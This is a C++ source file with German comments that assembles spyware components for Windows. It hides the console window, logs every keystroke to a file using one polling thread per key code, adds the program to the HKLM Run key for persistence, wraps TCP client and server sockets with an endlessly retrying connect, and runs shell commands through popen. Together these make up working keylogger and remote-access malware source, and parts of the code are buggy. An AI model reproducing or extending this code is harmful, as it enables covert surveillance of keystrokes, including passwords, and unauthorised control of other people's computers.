#include<winsock2.h>
#include <windows.h>
#include<Winuser.h>
#include <iostream>
#include<stdio.h>
#include <thread>
#include <string>
#include <stdlib.h> 
#include <Windows.h>
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

/**

Erstellt von Tim Emmert

Bei Winsock2 Errors der Linker Kommandozeile folgendes hinzufügen: -lws2_32 (unter gcc)
Für Threading folgendes Compilerargument: -std=c++11 (unter gcc)
**/
using std::thread;
using std::cin;
using std::cout;
using std::endl;

void HelloWorld()
{
	MessageBox(HWND_DESKTOP,"Hello","Message Box",MB_OK);	
}

void hideConsole()
{
	FreeConsole();
}

int saveInFile(char *string, char *file)
{
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file,"a+");
	if(fprintf(OUTPUT_FILE, "%s", string)>-1)
	{
		if(fclose(OUTPUT_FILE)>-1)
		{
			return 0;
		}
	}
	return -1;
}
int saveInFile(int key_stroke, char *file)
{
	if(    (key_stroke ==1) or (key_stroke ==2)   )
	return 0;
	
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file,"a+");

	if (key_stroke == 8)
	 fprintf(OUTPUT_FILE, "%s","[BACKSPACE]");
	 else if (key_stroke == 13)
	 fprintf(OUTPUT_FILE, "%s","\n");
	 else if (key_stroke == 32)
	 fprintf(OUTPUT_FILE, "%s"," ");
	  else if (key_stroke == VK_TAB)
	 fprintf(OUTPUT_FILE, "%s","[TAB]");
	 else if (key_stroke == VK_SHIFT)
	 fprintf(OUTPUT_FILE, "%s","[SHIFT]");
	 else if (key_stroke == VK_SHIFT)
	 fprintf(OUTPUT_FILE, "%s","[CONTROL]");
	 else if (key_stroke == VK_ESCAPE)
	 fprintf(OUTPUT_FILE, "%s","[ESCAPE]");
	 else if (key_stroke == VK_END)
	 fprintf(OUTPUT_FILE, "%s","[END]");
	 else if (key_stroke == VK_HOME)
	 fprintf(OUTPUT_FILE, "%s","[HOME]");
	 else if (key_stroke == VK_LEFT)
	 fprintf(OUTPUT_FILE, "%s","[LEFT]");
	 else if (key_stroke == VK_UP)
	 fprintf(OUTPUT_FILE, "%s","[UP]");
	 else if (key_stroke == VK_RIGHT)
	 fprintf(OUTPUT_FILE, "%s","[RIGHT]");
	 else if (key_stroke == VK_DOWN)
	 fprintf(OUTPUT_FILE, "%s","[DOWN]");
	 else if (key_stroke == 190 or key_stroke == 110)
	 fprintf(OUTPUT_FILE, "%s",".");
	 else
	  fprintf(OUTPUT_FILE, "%s", &key_stroke);
	 
	 
	 fclose(OUTPUT_FILE);

	return 0;
}

//Sockets
/*

 getWSA() zur initialisierung
 getSocket() erstellt einen Socket
 getSockaddr() gibt eine sockaddr_in structure zurück
 connect() verbindet einen Socket mit einem in einer sockaddr_in structure festgelegten host
 sendTCP() sendet einen String über einen Socket
 bindTCP() bindet einen Socket an eine lokale addresse
 accetTCP() akzeptiert eingehende verbindungen an einem gebundenen Socket
 receiveTCP() empfängt daten

*/
WSADATA getWSA()
{
	WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("\nInitialising Winsock...Failed. Error Code : %d",WSAGetLastError());
    }
    return wsa;
}

SOCKET getSocket()
{
	SOCKET s;
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d" , WSAGetLastError());
    }
    return s;
}

struct sockaddr_in  getSockaddr(char* ipAddr,int port)
{
	 struct sockaddr_in addr;
	addr.sin_addr.s_addr = inet_addr(ipAddr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons( port );
    return addr;
}

SOCKET connectSocket(SOCKET so, struct sockaddr_in addr)
{
	SOCKET s=so;
	if (connect(s , (struct sockaddr *)&addr , sizeof(addr)) < 0)
    {
        puts("connect error");
        
    }
    else
    puts("connected");
    return s;
}

void sendTCP(SOCKET s,char * message)
{
	send(s , message , strlen(message) , 0);
}

SOCKET bindTCP(SOCKET so,struct sockaddr_in addr)
{
	SOCKET s=so;
	if( bind(s ,(struct sockaddr *)&addr , sizeof(addr)) == SOCKET_ERROR)
    {
        printf("Bind failed with error code : %d" , WSAGetLastError());
    }
    return s;
}

SOCKET acceptTCP(SOCKET so,struct sockaddr_in addr,int backlog)
{
	listen(so , backlog);
	int c = sizeof(struct sockaddr_in);
    SOCKET new_socket = accept(so , (struct sockaddr *)&addr, &c);
    if (new_socket == INVALID_SOCKET)
    {
        printf("accept failed with error code : %d" , WSAGetLastError());
    }
    return new_socket;
}

int receiveTCP(SOCKET s,char * message)
{
	recv(s,message,sizeof(char)*strlen(message),0);
	return 0;
} 
//Netzwerkklassen


///////////////////////////////////////////////////////
class networking
{
	protected:
	bool active=true;
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in addr;
	public:
	bool isactive();
	void sendTCP(const char* message);
	char* receiveTCP();
	void close();
	
};
class server : public networking
{
	public:
	SOCKET acceptTCP();
	
	server(int port)
	{
		SOCKET se;
		wsa=getWSA();
		se=socket(AF_INET , SOCK_STREAM , 0 );
		addr.sin_addr.s_addr = inet_addr((const char*)"0.0.0.0");
    	addr.sin_family = AF_INET;
    	addr.sin_port = htons( port );
    	bind(se ,(struct sockaddr *)&addr , sizeof(addr));
    	listen(se , 0);
		int c = sizeof(struct sockaddr_in);
   		s = accept(se , (struct sockaddr *)&addr, &c);
		closesocket(se);
	}
	~server();
};
server::~server()
{
	
}
class client : public networking
{
	public:
	
	bool connectTo();
	
	client(const char* serverAddress,int port)
	{
		wsa=getWSA();
		addr.sin_addr.s_addr = inet_addr(serverAddress);
   		addr.sin_family = AF_INET;
   		addr.sin_port = htons( port );
   		s=socket(AF_INET , SOCK_STREAM , 0 );
	}
	~client();
	
	
};
client::~client()
{
	
}
bool client::connectTo()
{
	
	back:
	if (connect(s , (struct sockaddr *)&addr , sizeof(addr)) < 0)
		goto back;
	else 
		return true;
}
bool networking::isactive()
{
	return active;
}
void networking::sendTCP(const char* message)
{
	
	send(s,message,sizeof(message)*100,0);
	
}
char* networking::receiveTCP()
{
	char * message=(char*)malloc(sizeof(char)*1024);
	recv(s,message,sizeof(char)*1024+1,0);
	
	return message;
}
void networking::close()
{
	active=false;
	closesocket(s);
}
//Registry
/*
	Beispiel:
	HKEY key=openKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
	setRegVal(key,"teststr","test.exe");
	
	ACHTUNG: Programm muss als Administrator ausgeführt werden!
*/
HKEY openKey(HKEY hRootKey, char* strKey)
{
	HKEY hKey;
	RegOpenKey(HKEY_LOCAL_MACHINE, TEXT(strKey), &hKey);
	return hKey;
}
void setRegVal(HKEY hKey, char* value_name,  char* data)
{
	RegSetValueEx(hKey, TEXT(value_name), 0, REG_SZ, (LPBYTE)data, strlen(data)*sizeof(char));
}

void autostartEintrag(char* name,char* programm)
{
	HKEY k=openKey(HKEY_LOCAL_MACHINE,(char *)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
	setRegVal(k,name,programm);
}
void eintrag(char* ort,char* name,char* programm)
{
	HKEY k=openKey(HKEY_LOCAL_MACHINE,ort);
	setRegVal(k,name,programm);
}

//Logging Keystrokes

void log(int i,char* save)
{
	
	while (true)
	{
		Sleep(1);
		if (GetAsyncKeyState(i) == -32767)
		{
			saveInFile(i,save);
		}
	}
}
int logging(char* save)	
{
	
	thread *t;
	for(int i = 0;i < 255;i++)
	{
		t = new thread(log,i,save);
		t ++ ;
	}

	std::cin.get();
	return 0;
}
//SHELL Command

std::string exec(const char* cmd) {
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) return "ERROR";
    char buffer[128];
    std::string result = "";
    while (!feof(pipe.get())) {
        if (fgets(buffer, 128, pipe.get()) != NULL)
            result += buffer;
    }
    return result;
}

//Naives Blocken

void block(int p)
{
	WSADATA wsa = getWSA();
	SOCKET s = getSocket();
	sockaddr_in addr =  getSockaddr((char*)"127.0.0.1",p);
	s=bindTCP(s,addr);
}
	




